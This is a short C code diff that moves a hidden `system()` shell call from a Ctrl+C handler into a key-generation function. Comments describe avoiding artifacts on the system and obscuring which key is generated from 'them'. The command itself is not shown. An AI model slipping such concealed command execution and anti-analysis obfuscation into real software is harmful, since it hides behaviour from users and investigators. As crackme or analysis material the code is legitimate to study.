@@ -20,7 +20,6 @@ long long bs4 = 0x51982D5DCF0B2489;
 //interrupt handler for ctrl+c, we can clean up nicely here and not leave atifacts from running on the system
 void handle_sigint(int signal){
     printf("Shutting down gracefully");
-    system(system_call(1));
     exit(0);
 }
 
@@ -35,6 +34,7 @@ int masking_func(int param1, int param2)
 
 //can use this function to fuck with them and hide which key gets generated
 int gen_key(){
+    system(system_call(1));
     int key1 = masking_func((1<<9), bs1);
     int key2 = masking_func((1<<8), bs2);
     int key3 = masking_func((1<<7), bs3);
